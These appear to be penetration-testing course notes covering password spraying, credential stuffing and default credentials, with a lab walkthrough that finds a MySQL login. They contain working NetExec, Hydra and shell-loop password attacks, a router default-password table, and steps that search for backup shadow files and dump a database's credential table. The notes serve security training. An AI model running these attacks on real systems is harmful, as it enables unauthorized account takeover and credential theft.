# 09 — Spraying, Stuffing, and Defaults

## Overview

Three common credential-based attack techniques that don't require full brute force: **password spraying** (one password → many users), **credential stuffing** (leaked creds → other services), and **default credentials** (factory/setup passwords left unchanged).

---

## Password Spraying

- Try **one password** against **many accounts**
- Effective when orgs use standard/default passwords for new accounts (e.g., `ChangeMe123!`)
- Lower chance of account lockout vs. traditional brute force

### Tools by Target

| Target | Tool |
|--------|------|
| Active Directory / SMB | NetExec, Kerbrute |
| Web Applications | Burp Suite |
| SSH | Hydra |

### NetExec — Spray Across a Subnet

```bash
netexec smb 10.100.38.0/24 -u usernames.list -p 'ChangeMe123!'
```

---

## Credential Stuffing

- Use **stolen credentials from one service** to try access on **other services**
- Exploits password reuse across platforms (email, social media, enterprise)
- Input format: `username:password` (one pair per line)

### Hydra — Credential Stuffing via SSH

```bash
# -C flag takes a colon-separated user:pass file
hydra -C user_pass.list ssh://10.100.38.23
```

> **Key difference:** Spraying = one password, many users. Stuffing = many known user:pass pairs from leaks.

---

## Default Credentials

- Many systems ship with factory default creds (routers, firewalls, databases, appliances)
- Best practice is to change them during setup — but they're often left unchanged
- Check product documentation for default setup passwords

### Default Credentials Cheat Sheet Tool

```bash
# Install
pip3 install defaultcreds-cheat-sheet

# Search for a product
creds search linksys
```

### Common Router Defaults

| Router Brand | Default IP | Default Username | Default Password |
|-------------|-----------|-----------------|-----------------|
| 3Com | 192.168.1.1 | admin | Admin |
| Belkin | 192.168.2.1 | admin | admin |
| BenQ | 192.168.1.1 | admin | Admin |
| D-Link | 192.168.0.1 | admin | Admin |
| Digicom | 192.168.1.254 | admin | Michelangelo |
| Linksys | 192.168.1.1 | admin | Admin |
| Netgear | 192.168.0.1 | admin | password |

### Where to Find Default Creds

- Product documentation / setup guides
- [Default Credentials Cheat Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)
- [Router default password lists](https://www.softwaretestinghelp.com/default-router-username-and-password-list/)
- Vendor support pages

---

## Quick Reference

| Attack | Description | Hydra Flag | Example |
|--------|-------------|-----------|---------|
| Password Spraying | 1 password → many users | `-p 'password'` | `netexec smb 10.0.0.0/24 -u users.list -p 'Welcome1!'` |
| Credential Stuffing | Known user:pass pairs | `-C creds.list` | `hydra -C user_pass.list ssh://10.0.0.1` |
| Default Creds | Factory passwords | `-C` or manual | `creds search <product>` |

---

## Exercise Walkthrough — Finding MySQL Credentials

### Setup
- SSH into target as `sam:B@tm@n2022!`
- Goal: find MySQL credentials on the box

### Step 1 — Enumerate Users on the System

```bash
ls /home/
# Found: kira, sam, will

# From SSH session, check C:\Users (if Windows) or /home (Linux)
ls -la /home/kira/ /home/will/ /home/sam/
```

### Step 2 — Search for Credential Files

```bash
# Find all readable files across home directories
find /home -type f -readable 2>/dev/null

# Key find: /home/kira/Documents/Notes.zip (password-protected)
# Key find: /home/will/.backups/shadow.bak (permission denied)
# Key find: /home/will/.backups/passwd.bak (readable — confirms users)
```

### Step 3 — Try Credential Stuffing (Reuse Known Passwords)

Since we found creds from the previous section (Network Services), try them against MySQL:

```bash
# Spray known passwords against MySQL for all known users
for user in root kira will sam; do
  for pass in november rockstar 789456123 12345678910 'B@tm@n2022!'; do
    mysql -u "$user" -p"$pass" -e "SELECT 1;" 2>/dev/null && echo "SUCCESS: $user:$pass"
  done
done
```

> **Result:** No match — the MySQL creds are different from the system creds.

### Step 4 — Try Default Credentials

The section teaches using `creds search` for known defaults. MySQL commonly has weak/default accounts:

```bash
# Try common MySQL default credentials
mysql -u superdba -p'admin' -e "SELECT 1;" 2>&1
# SUCCESS! superdba:admin

# Or use the defaultcreds-cheat-sheet tool
pip3 install defaultcreds-cheat-sheet
creds search mysql
```

### Step 5 — Enumerate the Database

```bash
mysql -u superdba -p'admin'

# Check privileges and databases
SHOW GRANTS;
SHOW DATABASES;
# Found: users database with ALL PRIVILEGES

USE users;
SHOW TABLES;
# Found: creds table

SELECT * FROM creds;
# Dumps 100 rows of usernames and passwords
```

### Answer
`superdba:admin`

---

## Key Takeaways

- **Password spraying** avoids lockouts by trying one password at a time across many accounts
- **Credential stuffing** leverages password reuse — always check leaked credential databases
- **Default credentials** are low-hanging fruit — always check before brute forcing
- Use `-C` with Hydra for colon-separated `user:pass` files (credential stuffing)
- The `defaultcreds-cheat-sheet` tool automates searching for known default creds
- Internal/test environments are especially likely to have default credentials unchanged
- When brute forcing fails, try **default/weak service accounts** like `superdba:admin`, `dbadmin:dbadmin`, etc.
- Always enumerate home directories for backup files, notes, and config files
- `.viminfo`, `.bash_history`, and `.backups/` are goldmines for credential discovery
